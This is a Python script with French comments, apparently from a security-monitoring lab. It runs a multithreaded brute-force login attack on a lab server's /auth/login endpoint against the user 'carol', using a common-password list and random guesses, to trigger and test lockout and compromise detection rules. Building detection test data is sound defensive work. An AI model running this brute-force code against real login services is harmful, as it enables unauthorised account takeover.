#!/usr/bin/env python3
"""Attaque secondaire : brute-force sur /auth/login contre le compte 'carol' (mot de passe volontairement
faible, voir WEAK_PASSWORD). Mêmes conventions que flood.py (reproductible, une seule IP, logique en clair).

Fournit en interne ce que attacker/README.md suggérait de faire avec un outil externe (Hydra...) :
utile si aucun second outil n'est disponible, ou pour générer automatiquement le jeu d'entraînement
« brute » de scripts/bootstrap_model.sh sans dépendre d'un outil tiers.

Deux modes :
  - essais perdants uniquement (par défaut) : déclenche verrouillage (règle SIEM R2) ;
  - --succeed-after N : le Nième essai utilise le VRAI mot de passe (si fourni via --real-password) ::
    déclenche en plus la détection de compromission probable (R3 : échecs en rafale puis succès)."""
import argparse, itertools, random, string, sys, threading, time
import httpx

ap = argparse.ArgumentParser()
ap.add_argument("--target", default="http://10.136.206.89:8080")
ap.add_argument("--user", default="carol")
ap.add_argument("--real-password", default=None, help="mot de passe réel de la cible : permet --succeed-after")
ap.add_argument("--succeed-after", type=int, default=0, help="0 = jamais ; sinon, le Nième essai réussit (sur le thread 0)")
ap.add_argument("--threads", type=int, default=6)
ap.add_argument("--seconds", type=int, default=60)
ap.add_argument("--delay-ms", type=int, default=120, help="pause entre deux essais d'un même thread (réalisme, évite une seule rafale réseau)")
a = ap.parse_args()

if a.succeed_after and not a.real_password:
    print("--succeed-after nécessite --real-password"); sys.exit(1)

stop = time.time() + a.seconds
counters = {"sent": 0, "fail": 0, "locked": 0, "ok": 0, "err": 0}
lock = threading.Lock()


def guesses():
    """Mots de passe plausibles mais faux : dictionnaire restreint + variantes courtes (comportement Hydra-like)."""
    common = ["123456", "password", "azerty", "motdepasse", "carol2024", "soleil", "bonjour", "qwerty", "carol123"]
    for w in itertools.cycle(common):
        yield w
    while True:
        yield "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


def worker(idx):
    tries = guesses()
    n = 0
    with httpx.Client(timeout=4) as c:
        while time.time() < stop:
            n += 1
            with lock:
                use_real = idx == 0 and a.succeed_after and counters["sent"] + 1 >= a.succeed_after
            pwd = a.real_password if use_real else next(tries)
            try:
                r = c.post(a.target + "/auth/login", json={"username": a.user, "password": pwd})
                with lock:
                    counters["sent"] += 1
                    if r.status_code == 200:
                        counters["ok"] += 1
                    elif r.status_code == 423:
                        counters["locked"] += 1
                    elif r.status_code == 401:
                        counters["fail"] += 1
                    else:
                        counters["err"] += 1
            except Exception:
                with lock:
                    counters["sent"] += 1; counters["err"] += 1
            time.sleep(max(0, a.delay_ms) / 1000)


threads = [threading.Thread(target=worker, args=(i,)) for i in range(a.threads)]
print(f"BRUTE-FORCE: {a.threads} threads pendant {a.seconds}s sur {a.target}/auth/login (compte '{a.user}')"
      + (f", succès programmé au {a.succeed_after}e essai" if a.succeed_after else ""))
[t.start() for t in threads]
while time.time() < stop:
    time.sleep(2); print(counters, flush=True)
[t.join() for t in threads]
print("FIN", counters)
